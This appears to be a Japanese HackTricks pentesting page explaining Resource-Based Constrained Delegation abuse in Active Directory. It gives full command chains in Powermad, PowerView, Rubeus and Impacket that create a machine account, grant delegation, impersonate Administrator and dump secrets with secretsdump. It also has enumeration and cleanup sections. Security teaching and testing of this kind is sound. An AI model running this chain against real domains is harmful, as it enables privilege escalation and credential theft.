# リソースベースの制約付き委任

{{#include ../../banners/hacktricks-training.md}}


## リソースベースの制約付き委任の基本

これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**オブジェクト**に**任意のユーザーをマシンに対してなりすます**権限を与えるのではなく、リソースベースの制約付き委任は**そのオブジェクトに対して任意のユーザーをなりすますことができる**ユーザーを**設定**します。

この場合、制約オブジェクトには、任意の他のユーザーをそのオブジェクトに対してなりすますことができるユーザーの名前を持つ属性 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ が存在します。

この制約付き委任と他の委任との重要な違いは、**マシンアカウントに対する書き込み権限** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できることです（他の委任形式ではドメイン管理者の特権が必要でした）。

### 新しい概念

制約付き委任では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要であると述べられていました。しかし、それは完全に真実ではありません。\
実際には、その値がなくても、**サービス**（SPNを持つ）であれば任意のユーザーに対して **S4U2Self** を実行できますが、**`TrustedToAuthForDelegation`** を持っている場合、返される TGS は **Forwardable** になります。もしそのフラグを持っていない場合、返される TGS は **Forwardable** ではありません。

ただし、**S4U2Proxy** で使用される **TGS** が **Forwardable でない**場合、基本的な制約付き委任を悪用しようとしても**機能しません**。しかし、リソースベースの制約付き委任を悪用しようとすると、**機能します**。

### 攻撃構造

> **コンピュータ**アカウントに対して**書き込み同等の権限**を持っている場合、そのマシンで**特権アクセス**を取得できます。

攻撃者がすでに**被害者コンピュータに対する書き込み同等の権限**を持っていると仮定します。

1. 攻撃者は**SPN**を持つアカウントを**侵害**するか、**作成します**（“Service A”）。注意すべきは、**特別な権限**を持たない**管理ユーザー**は最大10個のコンピュータオブジェクト（**_MachineAccountQuota_**）を**作成**し、SPNを設定できることです。したがって、攻撃者はコンピュータオブジェクトを作成し、SPNを設定することができます。
2. 攻撃者は被害者コンピュータ（ServiceB）に対する**書き込み権限**を悪用して、**リソースベースの制約付き委任を構成し、ServiceAがその被害者コンピュータ（ServiceB）に対して任意のユーザーをなりすますことを許可します**。
3. 攻撃者は Rubeus を使用して、**特権アクセスを持つユーザー**のために Service A から Service B への **フル S4U 攻撃**（S4U2Self と S4U2Proxy）を実行します。
   1. S4U2Self（侵害または作成されたアカウントの SPN から）：**私に対する管理者の TGS を要求します**（Forwardable ではない）。
   2. S4U2Proxy：前のステップの**Forwardable でない TGS**を使用して、**被害者ホスト**への**管理者**の**TGS**を要求します。
   3. Forwardable でない TGS を使用している場合でも、リソースベースの制約付き委任を悪用しているため、**機能します**。
   4. 攻撃者は**チケットをパス**し、ユーザーを**なりすまし**て**被害者 ServiceB へのアクセスを取得します**。

ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用できます：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad)** を使用して、ドメイン内にコンピュータオブジェクトを作成できます:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### リソースベースの制約付き委任の構成

**activedirectory PowerShell モジュールを使用**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerViewの使用**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全なS4U攻撃を実行する (Windows/Rubeus)

まず最初に、パスワード`123456`で新しいコンピュータオブジェクトを作成したので、そのパスワードのハッシュが必要です:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
このコマンドは、そのアカウントのRC4およびAESハッシュを出力します。\
次に、攻撃を実行できます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeusの`/altservice`パラメータを使用すると、一度のリクエストでより多くのサービスのチケットを生成できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには「**委任できない**」という属性があります。この属性がTrueの場合、そのユーザーを偽装することはできません。このプロパティはbloodhound内で確認できます。

### Linuxツール: Impacketを使用したエンドツーエンドRBCD (2024+)

Linuxから操作する場合、公式のImpacketツールを使用して完全なRBCDチェーンを実行できます:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
ノート
- LDAP署名/LDAPSが強制されている場合は、`impacket-rbcd -use-ldaps ...`を使用してください。
- AESキーを優先してください。多くの現代のドメインはRC4を制限しています。ImpacketとRubeusはどちらもAES専用フローをサポートしています。
- Impacketは一部のツールのために`sname`（"AnySPN"）を書き換えることができますが、可能な限り正しいSPNを取得してください（例：CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

### アクセス

最後のコマンドラインは**完全なS4U攻撃を実行し、管理者から被害者ホストにTGSを**メモリ内に**注入します。\
この例では、管理者から**CIFS**サービスのTGSが要求されたため、**C$**にアクセスできるようになります。
```bash
ls \\victim.domain.local\C$
```
### 異なるサービスチケットの悪用

[**利用可能なサービスチケットについてはこちら**](silver-ticket.md#available-services)を学びましょう。

## 列挙、監査、およびクリーンアップ

### RBCDが構成されたコンピュータの列挙

PowerShell（SIDを解決するためにSDをデコードする）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（1つのコマンドで読み取りまたはフラッシュ）：
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (属性をクリアする):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- インパケット:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberosがDESまたはRC4を使用しないように設定されており、RC4ハッシュのみを提供していることを意味します。Rubeusに少なくともAES256ハッシュ（またはRC4、AES128、AES256ハッシュをすべて提供）を供給してください。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時間がDCの時間と異なり、kerberosが正しく機能していないことを意味します。
- **`preauth_failed`**: これは、指定されたユーザー名 + ハッシュがログインに機能していないことを意味します。ハッシュを生成する際にユーザー名の中に「$」を入れるのを忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります：
  - 偽装しようとしているユーザーが希望するサービスにアクセスできない（偽装できないか、十分な権限がないため）
  - 要求されたサービスが存在しない（winrmのチケットを要求したが、winrmが実行されていない場合）
  - 作成されたfakecomputerが脆弱なサーバーに対する権限を失っており、それを戻す必要がある。
  - クラシックKCDを悪用しています。RBCDは非転送可能なS4U2Selfチケットで機能することを覚えておいてください。一方、KCDは転送可能である必要があります。

## Notes, relays and alternatives

- LDAPがフィルタリングされている場合、AD Web Services (ADWS) 上にRBCD SDを書くこともできます。参照してください：

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberosリレーチェーンは、ローカルSYSTEMを1ステップで達成するためにRBCDで終わることがよくあります。実用的なエンドツーエンドの例を参照してください：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (公式): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- 最近の構文を含むクイックLinuxチートシート: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
